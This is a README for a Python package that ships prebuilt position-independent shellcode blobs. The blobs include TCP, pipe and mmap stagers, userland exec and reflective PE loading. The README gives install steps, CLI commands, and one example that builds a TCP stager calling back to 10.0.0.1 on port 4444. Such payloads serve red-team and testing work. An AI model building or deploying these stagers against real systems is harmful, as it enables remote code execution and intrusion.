# picblobs

`picblobs` ships prebuilt position-independent code blobs plus a Python
API for selecting, inspecting, and assembling them.

The package contains the release-ready blob catalog:

- `manifest.json` for target and blob discovery
- Flat `.bin` payloads plus JSON sidecar metadata
- A builder API for parameterized blobs such as `alloc_jump`,
  `stager_tcp`, `stager_fd`, `stager_pipe`, `stager_mmap`, `ul_exec`,
  and `reflective_pe`

This package does not bundle the cross-compiled runner executables used
for QEMU-based execution and verification. Install
[`picblobs-cli`](https://pypi.org/project/picblobs-cli/) alongside it if
you want the CLI commands or bundled runners.

## Install

```bash
pip install picblobs
```

## Python API

```python
import picblobs
from picblobs import Blob

blob = picblobs.get_blob("hello", "linux", "x86_64")
print(blob.sha256)

stage = (
    Blob("linux", "x86_64")
    .stager_tcp()
    .address("10.0.0.1")
    .port(4444)
    .build()
)
```

## CLI

The CLI now lives entirely in the companion package:

```bash
pip install picblobs-cli
picblobs-cli list
picblobs-cli info hello linux:x86_64
picblobs-cli extract hello linux:x86_64 -o hello.bin
```

Installing `picblobs-cli` also provides the bundled runners and the full
build/run/verify toolchain:

```bash
picblobs-cli verify --os linux
```

## Project Links

- Documentation: https://github.com/williamkborn/pic/tree/main/docs
- Source: https://github.com/williamkborn/pic
